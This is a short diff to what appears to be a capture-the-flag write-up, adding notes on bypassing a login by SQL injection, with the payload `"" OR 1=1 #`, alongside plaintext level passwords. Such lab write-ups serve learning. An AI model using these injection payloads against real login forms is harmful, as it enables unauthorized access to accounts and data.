@@ -25,8 +25,14 @@ Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
   ```sql
   SELECT * from databaseTableOfUsers where username = "" # "" and password = "$userProvidedPassword"
   ```
+    - Query would be interpreted as:
+  ```sql
+  SELECT * from databaseTableOfUsers where username = "" #
+  ```
+  - Change query to
+  ```sql
+  SELECT * from databaseTableOfUsers where username = "" OR 1=1 #
+  ```
   - ![image](https://github.com/user-attachments/assets/55642d87-cd5c-4887-abe4-8b4242343d1d)
   - ![image](https://github.com/user-attachments/assets/be860f19-a586-4812-8a4e-032f7b44e198)
-
-
 - Password: `SdqIqBsFcz3yotlNYErZSZwblkm0lrvx`
